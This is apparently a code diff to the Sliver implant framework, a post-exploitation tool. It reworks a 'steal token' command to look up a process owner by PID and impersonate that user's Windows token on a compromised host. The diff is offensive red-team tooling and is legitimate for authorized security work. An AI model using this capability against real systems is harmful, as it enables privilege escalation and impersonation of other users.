@@ -4,7 +4,8 @@ package privilege
 	Sliver Implant Framework - Enhanced Token Operations
 	Copyright (C) 2024  Bishop Fox / mgstate
 
-	Steal token from a process by PID - simpler workflow than impersonate.
+	Steal token from a process by PID - resolves the process owner
+	and calls Impersonate with the username for a seamless workflow.
 */
 
 import (
@@ -33,26 +34,66 @@ func StealTokenCmd(cmd *cobra.Command, con *console.SliverClient, args []string)
 		return
 	}
 
-	pid, err := strconv.ParseUint(args[0], 10, 32)
+	pid, err := strconv.ParseInt(args[0], 10, 32)
 	if err != nil {
 		con.PrintErrorf("Invalid PID: %s\n", args[0])
 		return
 	}
 
+	// Step 1: Get process list to resolve PID -> username
 	ctrl := make(chan bool)
-	con.SpinUntil("Stealing token from PID ...", ctrl)
+	con.SpinUntil("Looking up process owner ...", ctrl)
 
-	stealToken, err := con.Rpc.Impersonate(context.Background(), &sliverpb.ImpersonateReq{
-		Request:  con.ActiveTarget.Request(cmd),
-		Username: "", // empty = use PID-based steal
+	psList, err := con.Rpc.Ps(context.Background(), &sliverpb.PsReq{
+		Request: con.ActiveTarget.Request(cmd),
 	})
 	ctrl <- true
 	<-ctrl
 
-	// If direct impersonate doesn't support PID, fall back to execute-assembly or inline approach
+	if err != nil {
+		con.PrintErrorf("Failed to list processes: %s\n", err)
+		return
+	}
+
+	// Find the target process
+	var targetOwner string
+	var targetExe string
+	for _, proc := range psList.Processes {
+		if proc.Pid == int32(pid) {
+			targetOwner = proc.Owner
+			targetExe = proc.Executable
+			break
+		}
+	}
+
+	if targetOwner == "" {
+		con.PrintErrorf("PID %d not found or no owner info available\n", pid)
+		con.PrintInfof("Try: ps | grep <process> to find valid PIDs\n")
+		return
+	}
+
+	con.PrintInfof("PID %d -> %s (owner: %s)\n", pid, targetExe, targetOwner)
+
+	// Step 2: Extract just the username (strip domain prefix if present)
+	username := targetOwner
+	// Owner format is typically "DOMAIN\username"
+	for i := len(username) - 1; i >= 0; i-- {
+		if username[i] == '\\' {
+			username = username[i+1:]
+			break
+		}
+	}
+
+	con.PrintInfof("Impersonating %s ...\n", targetOwner)
+
+	// Step 3: Call Impersonate with the resolved username
+	stealToken, err := con.Rpc.Impersonate(context.Background(), &sliverpb.ImpersonateReq{
+		Request:  con.ActiveTarget.Request(cmd),
+		Username: username,
+	})
+
 	if err != nil {
 		con.PrintErrorf("Token steal failed: %s\n", err)
-		con.PrintInfof("Alternative: use 'impersonate <username>' after finding the user with 'ps'\n")
 		return
 	}
 
@@ -63,20 +104,20 @@ func StealTokenCmd(cmd *cobra.Command, con *console.SliverClient, args []string)
 				con.PrintErrorf("Failed to decode response %s\n", err)
 				return
 			}
-			PrintStealToken(stealToken, uint32(pid), con)
+			PrintStealToken(stealToken, int32(pid), targetOwner, con)
 		})
 		con.PrintAsyncResponse(stealToken.Response)
 	} else {
-		PrintStealToken(stealToken, uint32(pid), con)
+		PrintStealToken(stealToken, int32(pid), targetOwner, con)
 	}
 }
 
 // PrintStealToken - Print the result of token steal
-func PrintStealToken(result *sliverpb.Impersonate, pid uint32, con *console.SliverClient) {
+func PrintStealToken(result *sliverpb.Impersonate, pid int32, owner string, con *console.SliverClient) {
 	if result.Response != nil && result.Response.GetErr() != "" {
-		con.PrintErrorf("Token steal from PID %d failed: %s\n", pid, result.Response.GetErr())
+		con.PrintErrorf("Token steal from PID %d (%s) failed: %s\n", pid, owner, result.Response.GetErr())
 		return
 	}
-	con.PrintInfof("Successfully stole token from PID %d\n", pid)
+	con.PrintInfof("Successfully stole token from PID %d (%s)\n", pid, owner)
 	con.PrintInfof("Use 'whoami' to verify, 'rev2self' to revert\n")
 }
